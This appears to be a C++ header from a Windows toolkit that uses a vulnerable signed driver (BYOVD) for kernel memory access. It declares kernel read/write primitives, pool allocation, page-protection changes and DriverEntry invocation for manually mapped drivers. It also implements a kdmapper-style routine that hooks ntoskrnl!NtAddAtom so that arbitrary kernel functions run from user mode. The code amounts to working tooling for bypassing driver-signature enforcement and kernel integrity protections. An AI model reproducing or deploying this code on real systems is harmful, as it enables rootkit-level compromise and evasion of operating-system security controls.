#pragma once
#include <windows.h>
#include <cstdint>
#include <string>
#include <vector>
#include <type_traits>

#include "hinv_byovd.hpp"

namespace hinv {
namespace kmem {

// Loaded kernel module descriptor.
struct KernelModule {
    std::wstring name;
    uint64_t     base = 0;
    uint32_t     size = 0;
};

// Normalize a module file name or path to the canonical kernel module name.
// Handles paths, extensions, and common kernel module aliases.
std::wstring NormalizeModuleName(const std::string& moduleName);
std::wstring NormalizeModuleName(const std::wstring& moduleName);

// Enumerate loaded kernel modules using NtQuerySystemInformation(SystemModuleInformation).
std::vector<KernelModule> EnumKernelModules();

// Process-local registry of modules manually mapped by hinv::mapper. Such
// modules never appear in EnumKernelModules (PsLoadedModuleList), so import
// resolution for chain-mapped modules (e.g. HyperDbg's companion DLLs)
// consults this registry first. The mapped image keeps its PE headers in
// kernel memory, so export parsing works through the backend read primitive.
struct MappedModule {
    std::wstring name;  // lowercase file name with extension, e.g. L"hyperhv.dll"
    uint64_t     base = 0;
    uint32_t     size = 0;
};

// Register (or update) a manually mapped module. Name is lowercased and
// stripped of any path. No-op for empty names or zero base/size.
void RegisterMappedModule(const std::wstring& moduleName, uint64_t base, uint32_t size);

// Resolve kernel export RVA using in-memory PE parsing via backend read.
// Returns 0 on failure.
uint64_t GetKernelExport(byovd::IByovdBackend* backend, uint64_t moduleBase, const char* exportName);

// Resolve a kernel export by module name + export name.
uint64_t ResolveKernelExport(byovd::IByovdBackend* backend, const wchar_t* moduleName, const char* exportName);

// Windows version info used to pick kernel structure layouts.
struct OsVersionInfo {
    uint32_t major = 0;
    uint32_t minor = 0;
    uint32_t build = 0;
    uint32_t revision = 0;
};

// Get OS version via NtQuerySystemInformation(SystemVersionInformation).
OsVersionInfo GetOsVersion();

// Read/write primitive wrappers for convenience.
inline bool ReadU64(byovd::IByovdBackend* b, uint64_t va, uint64_t& out) { return b->ReadKernelMemory(va, &out, sizeof(out)); }
inline bool ReadU32(byovd::IByovdBackend* b, uint64_t va, uint32_t& out) { return b->ReadKernelMemory(va, &out, sizeof(out)); }
inline bool WriteU64(byovd::IByovdBackend* b, uint64_t va, uint64_t in)   { return b->WriteKernelMemory(va, &in, sizeof(in)); }
inline bool WriteU32(byovd::IByovdBackend* b, uint64_t va, uint32_t in)   { return b->WriteKernelMemory(va, &in, sizeof(in)); }

// Debug trace: appends a stage marker to the file named by the HINV_TRACE
// environment variable (one line, flushed by close). No-op when unset.
// Exists because stdout buffering loses everything on a bugcheck.
void Trace(const char* stage);

namespace detail {

// Install/remove the temporary ntoskrnl!NtAddAtom prologue hook used by
// CallKernelFunction. `original` receives the overwritten bytes (12 bytes:
// mov rax, imm64; jmp rax). Implemented in hinv_kmem.cpp.
bool InstallCallHook(byovd::IByovdBackend* backend, uint64_t target, uint8_t (&original)[12]);
bool RemoveCallHook(byovd::IByovdBackend* backend, const uint8_t (&original)[12]);

// User-mode ntdll!NtAddAtom address (the syscall stub we invoke).
void* UserNtAddAtom();

} // namespace detail

// Call an arbitrary kernel function with up to 4 register arguments,
// kdmapper-style: the first bytes of ntoskrnl!NtAddAtom are replaced with a
// `mov rax, funcVa; jmp rax` stub through the backend's read-only write
// primitive (physical mapping on the Intel backend), then ntdll!NtAddAtom is
// invoked from usermode — the syscall enters the hook with our argument
// registers intact and the target's RAX becomes our return value. The
// prologue is always restored. No shellcode, no HalDispatchTable, no PTE
// self-reference games.
template<typename T, typename... A>
bool CallKernelFunction(byovd::IByovdBackend* backend, T* outResult, uint64_t funcVa, A... args) {
    static_assert(sizeof...(A) <= 4, "CallKernelFunction supports at most 4 register arguments");
    constexpr bool isVoid = std::is_same_v<T, void>;

    if constexpr (!isVoid) {
        if (!outResult) return false;
    } else {
        (void)outResult;
    }
    if (!backend || !funcVa) return false;

    uint8_t original[12]{};
    if (!detail::InstallCallHook(backend, funcVa, original)) return false;

    using Fn = T(__stdcall*)(A...);
    auto fn = reinterpret_cast<Fn>(detail::UserNtAddAtom());
    Trace("kmem: syscall begin");
    if constexpr (isVoid) {
        fn(args...);
    } else {
        *outResult = fn(args...);
    }
    Trace("kmem: syscall returned");

    return detail::RemoveCallHook(backend, original);
}

// Allocate kernel pool memory via ExAllocatePoolWithTag (NonPagedPool; NX on
// Win8+, use ProtectKernelMemory to make it executable when needed).
bool AllocateKernelMemory(byovd::IByovdBackend* backend, size_t size, uint64_t& outKernelVa);

// Free pool memory allocated by AllocateKernelMemory (ExFreePoolWithTag).
bool FreeKernelMemory(byovd::IByovdBackend* backend, uint64_t kernelVa);

// Change page protection of a kernel range via MmSetPageProtection.
bool ProtectKernelMemory(byovd::IByovdBackend* backend, uint64_t kernelVa, size_t size, uint32_t protect);

// Call a driver entry point in Ring 0. Returns the NTSTATUS produced by DriverEntry.
uint32_t CallDriverEntry(byovd::IByovdBackend* backend, uint64_t driverEntryVa,
                         uint64_t driverObjectVa, uint64_t registryPathVa);

} // namespace kmem
} // namespace hinv
